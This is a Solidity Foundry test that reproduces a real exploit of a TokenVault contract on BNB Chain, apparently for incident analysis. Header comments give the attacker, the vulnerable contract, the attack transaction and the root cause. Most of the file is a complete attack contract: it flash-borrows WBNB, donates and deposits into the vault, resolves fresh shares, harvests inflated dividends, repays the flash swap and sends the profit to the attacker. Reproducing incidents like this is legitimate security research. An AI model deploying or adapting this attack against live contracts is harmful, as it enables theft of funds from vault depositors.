// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,226.51 USD
// Attacker : 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE
// Attack Contract : 0x96cFc7fd01fCF3A3b6eE4891b4D2B7e0A951AD70
// Vulnerable Contract : 0x5b68EfE78D9951a8C347A5Dc807998c40934CD14
// Attack Tx : https://bscscan.com/tx/0x3de562f2fdaeb379ccbe8d244a56189db2a0f91410cd0f464274e51e4518e555
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5b68EfE78D9951a8C347A5Dc807998c40934CD14#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1325
//
// Attack summary: the attacker borrowed WBNB from the Pancake WBNB/USDT pair, donated WBNB into the
// TokenVault drip pool, deposited WBNB into the vault, resolved the fresh shares, harvested the resulting
// WBNB dividends, repaid the flash swap, and kept the remaining WBNB.
// Root cause: TokenVault adds freshly deposited shares before allocating deposit fees and also lets a
// same-transaction holder resolve then harvest against existing drip/fee accounting. A temporary WBNB
// position can therefore receive more WBNB from the vault than the donated/deposited principal.
// Related incident: BUSD TokenVault tx
// https://bscscan.com/tx/0x00e5c8e39eece020ad21d965402d2f9248f0a6ab62030830b12f9823c2b6d763

address constant ATTACKER = 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE;
address constant WBNB_USDT_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
address constant TOKEN_VAULT = 0x5b68EfE78D9951a8C347A5Dc807998c40934CD14;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

uint256 constant FLASH_WBNB_AMOUNT = 4 ether;
uint256 constant DONATE_AMOUNT = 2 ether;
uint256 constant DEPOSIT_AMOUNT = 1_114_100_000_000_000_000;
uint256 constant HISTORICAL_SHARE_BALANCE = 1_002_690_000_000_000_000;
uint256 constant HARVESTED_WBNB = 8_108_136_659_505_117_400;
uint256 constant FLASH_WBNB_REPAY = 4_010_400_000_000_000_000;
uint256 constant HISTORICAL_PROFIT = 4_983_636_659_505_117_400;

interface ITokenVault1325 {
    function donate(
        uint256 amount
    ) external returns (uint256);
    function depositTo(address user, uint256 amount) external returns (uint256);
    function myTokens() external view returns (uint256);
    function resolve(
        uint256 amount
    ) external;
    function harvest() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        // step 1: fork before the attack transaction and configure WBNB as the profit asset.
        uint256 forkBlock = 51_783_614;
        vm.createSelectFork("bsc", forkBlock);
        vm.roll(51_783_615);
        vm.warp(1_750_419_729);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(WBNB_USDT_PAIR, "WBNB/USDT Pancake pair");
        vm.label(TOKEN_VAULT, "TokenVault");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        // step 2: verify pair token ordering and capture balances before the flash swap.
        assertEq(IPancakePair(WBNB_USDT_PAIR).token0(), USDT_TOKEN);
        assertEq(IPancakePair(WBNB_USDT_PAIR).token1(), WBNB_TOKEN);

        uint256 pairWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(WBNB_USDT_PAIR);
        uint256 attackerWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        TokenVaultAttack attack = new TokenVaultAttack(ATTACKER);
        // step 3: execute the attacker flow.
        attack.execute();

        uint256 attackerProfit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - attackerWbnbBefore;
        // step 8: assert the trace-matched WBNB profit and pair repayment.
        assertEq(attackerProfit, HISTORICAL_PROFIT);
        assertEq(IERC20(WBNB_TOKEN).balanceOf(WBNB_USDT_PAIR), pairWbnbBefore + FLASH_WBNB_REPAY - FLASH_WBNB_AMOUNT);
    }
}

contract TokenVaultAttack is IPancakeCallee {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        // step 4: borrow WBNB from the Pancake pair and enter pancakeCall.
        IPancakePair(WBNB_USDT_PAIR).swap(0, FLASH_WBNB_AMOUNT, address(this), abi.encode(uint256(1)));
        // step 7: forward remaining WBNB profit to the attacker.
        IERC20(WBNB_TOKEN).transfer(profitReceiver, IERC20(WBNB_TOKEN).balanceOf(address(this)));
    }

    function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata) external override {
        require(msg.sender == WBNB_USDT_PAIR, "unexpected pair");
        require(amount0 == 0 && amount1 == FLASH_WBNB_AMOUNT, "unexpected flash amount");

        // step 5: donate and deposit WBNB so fresh shares join the same accounting round.
        IERC20(WBNB_TOKEN).approve(TOKEN_VAULT, FLASH_WBNB_AMOUNT);

        ITokenVault1325(TOKEN_VAULT).donate(DONATE_AMOUNT);
        ITokenVault1325(TOKEN_VAULT).depositTo(address(this), DEPOSIT_AMOUNT);

        uint256 shareBalance = ITokenVault1325(TOKEN_VAULT).myTokens();
        require(shareBalance == HISTORICAL_SHARE_BALANCE, "unexpected shares");

        // step 6: resolve fresh shares, harvest inflated WBNB dividends, and repay the flash swap.
        ITokenVault1325(TOKEN_VAULT).resolve(shareBalance);

        uint256 beforeHarvest = IERC20(WBNB_TOKEN).balanceOf(address(this));
        ITokenVault1325(TOKEN_VAULT).harvest();
        require(IERC20(WBNB_TOKEN).balanceOf(address(this)) - beforeHarvest == HARVESTED_WBNB, "unexpected harvest");

        IERC20(WBNB_TOKEN).transfer(WBNB_USDT_PAIR, FLASH_WBNB_REPAY);
    }
}
